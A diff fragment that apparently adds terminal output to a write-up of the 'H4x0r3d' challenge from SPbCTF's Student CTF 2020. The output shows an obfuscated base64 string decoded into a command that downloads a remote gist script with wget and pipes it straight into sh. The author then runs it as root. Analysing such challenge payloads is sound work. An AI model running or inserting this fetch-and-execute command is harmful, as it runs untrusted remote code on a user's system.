@@ -1,4 +1,8 @@
 ```
+root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d$ echo 
+c2ggLWMgIiQod2dldCAtTy1odHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FldGhlckV0ZXJuaXR5LzQ4NGZlYzZmYjBmMjdlZjZlYzgxYjU4YWVlNTZlZGQxL3Jhdy8wN2MyZjc5NjBlYTE1MmVmOTRjMjBmZDJjMD
+lkZjU0YmMyMWQ4NmU5L3N0YWdlLnNoKSI | base64 -d
+sh -c "$(wget -O-https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh)"
 root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# sh -c "$(wget -O- https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh)"
 --2020-11-21 18:50:25--  https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh
 Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 151.101.12.133
